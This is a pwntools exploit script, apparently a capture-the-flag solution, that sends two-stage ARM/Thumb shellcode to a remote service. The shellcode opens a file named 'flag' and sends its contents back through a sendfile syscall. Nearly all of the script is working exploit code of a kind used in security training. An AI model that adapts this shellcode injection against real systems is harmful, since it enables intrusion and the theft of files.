from pwn import *

context.arch = "arm"
context.endian = "little"
context.bits = 32

def cool_print(b):
    print(".".join([hex(i)[2:] for i in b]))

if args["REMOTE"]:
    p = remote("16.16.80.50", int(input("port? ")))
else:
    p = remote("localhost", int(input("port? ")))

stage1 = asm("sub pc, pc, #0x6b")

cool_print(stage1)

context.arch = "thumb"

stage2 = asm("nop") * 3 + asm("""
.syntax unified 
.thumb
movw r7, #(0x41414100 & 0xffff)                                 
movt r7, #(0x41414100 >> 16)
push {r7}
movw r7, #(0x67616c66 & 0xffff)
movt r7, #(0x67616c66 >> 16)
push {r7}
mov  r0, sp
movs r7, #SYS_open
svc  #0
mov  r1, r0
movs r0, #1
eors r2, r2
mvn  r3, #(0x7fffffff ^ (-1))
movs r7, #SYS_sendfile
svc  #0""")
#stage2 = asm(shellcraft.thumb.linux.cat("flag"))

cool_print(stage2)

# stage2 = stage2 + b"\x00" * (4 - (len(stage2) % 4))

#sh = b"".join([sh[4 * i:4 * (i + 1)][::-1] for i in range(int(len(sh) / 4))])

#print(sh)

def push(i):
    return (i + 128).to_bytes()

pushes = b"".join([push(i) for i in range(1, 14)]) + \
        push(14) * 4 + \
        b"\x25" + \
        push(14) * 8 + \
        push(0) + \
        b"\x00"

data = pushes + b"\xcc" + stage1 + stage2 + bytes(4)

p.sendline(b"\x03" + len(data).to_bytes() + data)